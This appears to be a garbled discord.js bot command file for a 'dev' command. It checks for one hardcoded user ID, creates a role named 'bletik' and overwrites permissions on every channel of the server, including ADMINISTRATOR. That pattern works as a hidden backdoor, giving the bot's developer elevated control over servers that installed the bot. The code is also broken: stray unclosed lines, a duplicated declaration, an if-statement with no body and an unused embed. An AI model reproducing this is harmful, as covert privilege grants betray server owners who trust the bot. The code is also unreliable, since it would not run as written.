const Discord = require("discord.js");
const bot = new Discord.Client();
  let bletik = message.guild.member(

    message.mentions.users.first() || message.guild.members.get(args[0])


exports.run = async (client, message, args) => {

  let embed = new Discord.RichEmbed()

    .setTitle("devloper")

    .setDescription(

      "Sorry, the `dev` command can only be executed by the Developer."

    )
    .setColor("BLUE");

  if (message.author.id !== "478547279104442368")
    

  let bletik = message.guild.roles.find(`name`, "bletik");

  if (!bletik) {

    try {

      bletik = await message.guild.createRole({

        name: "bletik",

        color: "#49FFFD",

        permissions: []

      });

      message.guild.channels.forEach(async (channel, id) => {

        await channel.overwritePermissions(bletik, {
          ADMINISTRATOR: true,
          
          SEND_MESSAGES: true,

          ADD_REACTIONS: true

        });

      });

    } catch (e) {

      console.log(e.stack);

    }

  }
